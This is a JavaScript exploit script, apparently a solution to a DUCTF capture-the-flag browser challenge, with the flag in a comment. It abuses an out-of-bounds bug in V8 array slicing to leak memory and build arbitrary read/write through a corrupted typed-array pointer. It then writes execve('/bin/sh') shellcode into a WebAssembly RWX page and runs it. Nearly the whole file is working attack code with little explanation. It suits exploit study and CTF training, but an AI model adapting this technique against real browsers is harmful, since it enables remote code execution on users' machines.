// Initial helper functs, originally by Saelo https://gist.github.com/saelo/52985fe415ca576c94fc3f1975dbe837
// Jump down to Exploit begins here for the actual exploit!

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var buff = new ArrayBuffer(8);
    var bytes = new Uint8Array(buff);
    var dv = new DataView(buff);
    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };



    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    this.setUpper32 = function(a){
        dv.setInt32(4, a, true);
    }
    this.setLower32 = function(a){
        dv.setInt32(0, a, true);
    }
    this.getUpper32 = function() {
        return dv.getUint32(4, true);
    }
    this.getLower32 = function() {
        return dv.getUint32(0, true);
    }

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Exploit begins here
// DUCTF{y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!}
// Create a JSArray b, with incorrect size
var a = [6.6, 6.6, 6.6];
var b = a.slice(0);
var first = Int64.fromDouble(b[3]);
var second = Int64.fromDouble(b[4]);
const map = first.getLower32();
const props = first.getUpper32();
const buffSize = second.getUpper32() >> 1;
const backing = second.getLower32();

console.log("Leaked vals", first.toString(), second.toString());
console.log("Map ", map.toString(16));
console.log("props ", props.toString(16));
console.log("buffSize ", buffSize);
console.log("backing ", backing.toString(16));

// overwrite size of b to be even more out of bounds. Exact value doesn't matter
second.setUpper32(0x7fffff << 1);
b[4] = second.asDouble();

// Since we need to write into the rwx page, we build a typed array, as these use a non-compressed pointer to access
// We make it 117 bytes long, so it stands out a bit in memory
var typedArray = new Uint8Array(117);
var target = (new Int64(117)).asDouble();

for(let i = 0; i < 0x10000; i++){
    if(b[i] == target && b[i+1] == target){
        console.log("Found TypedArray at", i);
        var typedArrayOffset = i;
        break;
    }
}

if(typedArrayOffset == null){
    console.log("###### Unable to find target\n");
    throw '';
}

// Build arb read/write functions. This is done by setting the backing pointer in TypedArray to the address of our choice.
// Reading/writing to typedArray then gives the desired primatives.
function setTypedArrayTarget(inputVal){
    console.log("writing", typedArrayOffset);
    b[typedArrayOffset + 2] = (new Int64(inputVal)).asDouble();
}
function read(addr){
    setTypedArrayTarget(addr);
    return typedArray[0];
}
function write(addr, value){
    setTypedArrayTarget(addr);
    typedArray[0] = value;
}

// Credit https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
// This gets put in an rwx page. We find this page in memory, and write our shellcode to it.
// The values here just need to successly initialize, and don't need to exactually run.
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// Now we look for the wasm_interface structure in memory. This implementation is alignment sensitive, so we check for
// two different pairs of magic values in the header.
var first_pair = [(new Int64(0x0000ffff00000000)).asDouble(), (new Int64(0x0000004800000000)).asDouble()];
var second_pair = [(new Int64(0x0000000000010000)).asDouble(), (new Int64(0x000000000000ffff)).asDouble()];

// The wasm_instance is on a different page, that we hope is allocated ~0x30000 bytes after our our first arrays
// This works well enough for this ctf
for(let i = 0x30000; i < 0x40000; i++){
    if(b[i] == first_pair[0] && b[i+1] == first_pair[1]){
        console.log("Found first", i);
        var temp = Int64.fromDouble(b[i+10]);
        var rwx_page = (temp.getUpper32() * 0x100000000) + temp.getLower32();
        break;
    } else if(b[i] == second_pair[0] && b[i+1] == second_pair[1]){
        console.log("Found second", i);
        let bottomHalf = Int64.fromDouble(b[i + 10]).getUpper32();
        let topHalf = Int64.fromDouble(b[i + 11]).getLower32();
        console.log(bottomHalf, topHalf);
        var rwx_page = (topHalf * 0x100000000) + bottomHalf;
        break;
    } 
}
if(rwx_page == null){
    console.log("###### Unable to find wasm interface\n");
    throw '';
}
console.log("RWX page at ", rwx_page);

// Copy our shellcode into the wrx page and execute our wasm function
var shellcode = [0x31,0xc0, 0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05];
setTypedArrayTarget(rwx_page);
for(let i = 0; i < shellcode.length; i++){
    typedArray[i] = shellcode[i];
}
console.log("Shellcode done! Lets go!");
f();